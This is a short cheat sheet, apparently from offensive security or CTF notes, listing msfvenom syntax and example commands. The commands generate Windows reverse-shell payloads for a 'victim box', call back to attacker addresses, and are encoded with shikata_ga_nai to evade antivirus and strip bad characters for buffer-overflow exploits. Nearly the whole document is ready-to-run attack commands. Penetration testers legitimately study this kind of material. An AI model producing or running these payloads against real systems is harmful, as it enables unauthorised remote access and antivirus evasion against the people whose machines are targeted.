Generate reverse shell payloads to execute on a victim box:
	
	syntax : msfvenom -a <arch> --platform <OS> -p <payload> LHOST=<hostIP> LPORT=<hostPort> -f <fileType> -o <outputFile>
	example: msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.12.15.117 LPORT=6697 -f exe -o venom.exe


Generate encoded reverse shell payloads to bypass antivirus and exclude bad characters:	
	
	syntax : msfvenom -a <arch> --platform <OS> -p <payload> LHOST=<hostIP> LPORT=<hostPort> -e <encoder> -b '<badChars>' -f <fileType> -v <variableName>
	example: msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.0.124 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f python -v shellcode
	example: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.124 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread -f python -v shellcode
		 # EXITFUNC=thread is for remote BOF, when you close your reverse shell session, the target program won't crash

	example: msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.124 LPORT=4444 -e x86/shikata_ga_nai -i 9 -b '\x00\x0a\x0d' EXITFUNC=thread -f python -v shellcode
		 # The -i tag specifies how many times the file should be encoded
